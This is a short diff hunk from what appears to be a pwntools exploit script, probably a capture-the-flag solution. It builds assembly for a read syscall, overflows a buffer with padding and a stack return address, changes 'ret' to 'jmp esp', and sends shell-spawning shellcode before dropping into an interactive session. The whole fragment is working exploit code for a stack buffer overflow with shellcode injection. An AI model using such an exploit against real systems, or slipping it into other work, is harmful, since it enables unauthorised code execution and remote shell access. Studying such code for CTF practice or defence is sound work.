@@ -11,8 +11,8 @@ ass='''mov al,0x03\n
 	   mov ecx,esp\n
 	   mov dl,0x40\n
 	   int 0x80\n
-	   ret'''
+	   jmp esp'''
 p.send("A"*0x14+p32(address_esp+0x14)+asm(ass))
 sleep(3)
-p.send(p32(address_esp+0x14+0x04-0x40)+asm(shellcraft.sh()))
+p.send(asm(shellcraft.sh()))
 p.interactive()
